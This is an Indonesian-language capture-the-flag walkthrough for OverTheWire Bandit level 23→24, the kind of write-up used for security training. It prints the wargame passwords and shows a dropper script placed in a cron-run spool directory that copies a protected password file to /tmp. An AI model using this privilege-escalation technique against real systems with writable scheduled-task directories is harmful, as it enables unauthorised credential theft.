.# Over The Wired

## OverTheWire — Bandit Level 23 → 24

---

## 🧠 Deskripsi Level

Instruksi:

```
Sebuah program berjalan otomatis melalui cron.
Lihat konfigurasi di /etc/cron.d/
```

Hint:

* Kamu harus membuat shell script sendiri.
* Script akan dieksekusi oleh cron.
* Jangan lupa: cron bisa menghapus script setelah dijalankan.

Artinya:

Kita tidak membaca output seperti level sebelumnya.

Kita harus:

* Drop payload sendiri
* Biarkan cron mengeksekusi
* Ambil hasilnya

---

## 🔐 Login

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

Password sebelumnya:

```
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

---

## 1️⃣ Enumerasi Cron

```bash
cd /etc/cron.d
ls
```

Ada:

```
cronjob_bandit24
```

Buka:

```bash
cat cronjob_bandit24
```

Isi:

```
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Artinya:

* Jalan setiap menit
* Sebagai user bandit24
* Menjalankan script tertentu

---

## 2️⃣ Analisa Script

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Isi penting:

```bash
myname=$(whoami)
cd /var/spool/$myname
for i in *;
do
    if [ -x "$i" ]; then
        timeout -s 9 60 "./$i"
        rm -f "$i"
    fi
done
```

---

## 🔎 Analisa

Script melakukan:

1. Masuk ke `/var/spool/bandit24`
2. Loop semua file
3. Jika executable → jalankan
4. Setelah itu → hapus file

Artinya:

Kita bisa drop script ke:

```
/var/spool/bandit24
```

Cron akan:

* Jalankan sebagai bandit24
* Menghapus script setelah eksekusi

---

## 🎯 Strategi

Buat script yang:

* Membaca `/etc/bandit_pass/bandit24`
* Menyimpan hasil ke lokasi yang bisa kita baca

Misalnya:

```
/tmp/password24
```

---

## 3️⃣ Buat Script Payload

Masuk ke spool:

```bash
cd /var/spool/bandit24
```

Buat file:

```bash
nano getpass.sh
```

Isi:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/password24
```

Simpan.

---

## 4️⃣ Set Permission

```bash
chmod 777 getpass.sh
```

Kenapa?

Karena script hanya dijalankan jika executable.

---

## 5️⃣ Tunggu Cron

Cron berjalan setiap menit.

Tunggu ±60 detik.

Script akan:

* Dieksekusi
* Dihapus otomatis

---

## 6️⃣ Ambil Password

```bash
cat /tmp/password24
```

Output:

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

---

# ✅ Credential Level Berikutnya

```
Username: bandit24
Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

---

## 🧠 Konsep yang Dipelajari

### 1️⃣ Privilege Escalation via Scheduled Execution

Kita tidak menjadi bandit24.

Kita memanfaatkan cron yang berjalan sebagai bandit24.

---

### 2️⃣ Dropper / Payload Injection

Flow:

```
Tulis script
→ Taruh di directory target
→ Cron execute sebagai privileged user
→ Simpan hasil
→ Ambil hasil
```

---

### 3️⃣ Ephemeral Execution

Script:

* Dieksekusi
* Langsung dihapus

Karena itu kita harus:

* Simpan output di lokasi lain

---

### 4️⃣ Real-World Parallel

Mirip dengan:

* Writable cron directory
* Writable task scheduler folder
* Misconfigured automation pipeline

Ini contoh:

> Privilege escalation via writable scheduled task directory

---

## Ringkasan Brutal

* Enumerasi cron.
* Baca script.
* Drop executable payload.
* Tunggu cron run.
* Ambil hasil.
* Selesai.

Ini sudah masuk teknik klasik privilege escalation berbasis automation injection.
